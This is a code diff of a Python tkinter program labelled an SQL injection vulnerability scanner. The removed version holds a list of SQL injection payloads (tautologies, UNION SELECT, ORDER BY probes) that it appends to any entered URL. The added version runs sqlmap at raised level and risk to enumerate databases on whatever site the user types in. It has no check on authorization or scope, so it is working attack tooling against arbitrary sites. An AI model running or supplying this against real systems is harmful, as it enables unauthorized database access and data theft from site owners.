@@ -1,98 +1,122 @@
-import requests
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import messagebox, scrolledtext, ttk
+import requests
+import subprocess
+import threading
+from tkinterweb import HtmlFrame
 
-# List of SQL injection payloads
-payloads = [
-    "'",
-    "''",
-    "`",
-    "``",
-    ",",
-    '"',
-    '""',
-    "//",
-    "\\",
-    "\\\\",
-    ";",
-    "' or '",
-    "--",
-    "#",
-    "' OR '1'='1",
-    "' OR 1 -- -",
-    '" OR "" = "',
-    '" OR 1 = 1 -- -',
-    "' OR '' = '",
-    "'='",
-    "'LIKE'",
-    "=0--+",
-    " OR 1=1",
-    "' OR 'x'='x",
-    "' AND id IS NULL; --",
-    "'''''''''''''UNION SELECT '2",
-    "%00",
-    "/*…*/",
-    "1' ORDER BY 1--+",
-    "1' ORDER BY 2--+",
-    "1' ORDER BY 3--+",
-    "1' ORDER BY 1,2--+",
-    "1' ORDER BY 1,2,3--+"
-]
+class SQLiScannerApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("SQL Injection Vulnerability Scanner")
+        
+        # Create a frame for the website display
+        self.website_frame = tk.Frame(root)
+        self.website_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        # Create a frame for the results display
+        self.results_frame = tk.Frame(root)
+        self.results_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        
+        # URL input
+        self.url_label = tk.Label(self.website_frame, text="Enter URL:")
+        self.url_label.pack(pady=5)
+        self.url_entry = tk.Entry(self.website_frame, width=50)
+        self.url_entry.pack(pady=5)
+        
+        # Load button
+        self.load_button = tk.Button(self.website_frame, text="Load Website", command=self.load_website)
+        self.load_button.pack(pady=5)
+        
+        # Website display
+        self.html_frame = HtmlFrame(self.website_frame, horizontal_scrollbar="auto")
+        self.html_frame.pack(fill=tk.BOTH, expand=True)
+        
+        # Scan button
+        self.scan_button = tk.Button(self.results_frame, text="Scan for SQLi", command=self.start_scan)
+        self.scan_button.pack(pady=5)
+        
+        # Progress bar
+        self.progress = ttk.Progressbar(self.results_frame, orient="horizontal", length=300, mode="indeterminate")
+        self.progress.pack(pady=10)
+        
+        # Results display
+        self.results_text = scrolledtext.ScrolledText(self.results_frame, width=60, height=20)
+        self.results_text.pack(pady=5, fill=tk.BOTH, expand=True)
 
-def test_sql_injection(url):
-    results = []
-    for payload in payloads:
-        # Construct the full URL with the payload
-        test_url = f"{url}{payload}"
+    def load_website(self):
+        url = self.url_entry.get()
+        if not url:
+            messagebox.showwarning("Input Error", "Please enter a URL.")
+            return
+        
+        # Check if the website exists
+        if not self.check_website(url):
+            messagebox.showerror("Website Error", "The website does not exist.")
+            return
+        
+        # Load the website in the HTML frame
+        self.html_frame.load_website(url)
+
+    def start_scan(self):
+        url = self.url_entry.get()
+        if not url:
+            messagebox.showwarning("Input Error", "Please enter a URL.")
+            return
+        
+        # Start the scanning in a separate thread
+        self.results_text.delete(1.0, tk.END)  # Clear previous results
+        self.results_text.insert(tk.END, f"Scanning {url}...\n")
+        self.progress.start()
+        threading.Thread(target=self.scan, args=(url,)).start()
+
+    def scan(self, url):
         try:
-            # Send the request with a User-Agent header
-            headers = {
-                'User -Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-            }
-            response = requests.get(test_url, headers=headers)
+            # Run SQLMap and capture the output
+            output = self.run_sqlmap(url)
+            self.progress.stop()  # Stop the progress bar
             
-            # Check for signs of SQL injection
-            if response.status_code == 200:
-                # Check for common SQL error messages or changes in response content
-                if "error" in response.text.lower() or "sql" in response.text.lower():
-                    results.append(f"Potential SQL injection vulnerability found with payload: {payload}")
-                elif "mysql" in response.text.lower() or "syntax" in response.text.lower():
-                    results.append(f"Potential SQL injection vulnerability found with payload: {payload}")
-        except requests.RequestException as e:
-            # Handle any request exceptions
-            pass  # You can log the error if needed
+            # Parse the output and display results
+            databases = self.parse_sqlmap_output(output)
+            if databases:
+                self.results_text.insert(tk.END, "Databases found:\n")
+                for db in databases:
+                    self.results_text.insert(tk.END, f"{db}\n")
+            else:
+                self.results_text.insert(tk.END, "No databases found or no vulnerabilities detected.\n")
+        
+        except Exception as e:
+            self.results_text.insert(tk.END, f"Error: {str(e)}\n")
+            self.progress.stop()
 
-    # Show results in a message box
-    if results:
-        messagebox.showinfo("Scan Results", "\n".join(results))
-    else:
-        messagebox.showinfo("Scan Results", "No vulnerabilities found.")
+    def check_website(self, url):
+        try:
+            response = requests.get(url)
+            return response.status_code == 200
+        except requests.exceptions.RequestException:
+            return False
 
-def start_scan():
-    url = url_entry.get()
-    if url:
-        test_sql_injection(url)
-    else:
-        messagebox.showwarning("Input Error", "Please enter a valid URL.")
+    def run_sqlmap(self, url):
+        command = [
+            'sqlmap',  # Ensure sqlmap is in your PATH or provide the full path
+            '-u', url,
+            '--batch',  # Non-interactive mode
+            '--level=2',  # Level of tests to perform
+            '--risk=2',  # Risk level of tests to perform
+            '--dbs'  # Enumerate databases
+        ]
+        
+        result = subprocess.run(command, capture_output=True, text=True)
+        return result.stdout
 
-# Create the main window
-root = tk.Tk()
-root.title("SQL Injection Scanner")
+    def parse_sqlmap_output(self, output):
+        databases = []
+        for line in output.splitlines():
+            if "Database:" in line:
+                databases.append(line.strip())
+        return databases
 
-# Create a simple label for the title
-title_label = tk.Label(root, text="SQL Injection Scanner", font=("Arial", 16))
-title_label.pack(pady=10)
-
-# Create a label and entry for the URL
-url_label = tk.Label(root, text="Enter the target URL:")
-url_label.pack(pady=5)
-
-url_entry = tk.Entry(root, width=50)
-url_entry.pack(pady=5)
-
-# Create a button to start the scan
-scan_button = tk.Button(root, text="Start Scan", command=start_scan)
-scan_button.pack(pady=20)
-
-# Run the application
-root.mainloop()
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = SQLiScannerApp(root)
+    root.mainloop()
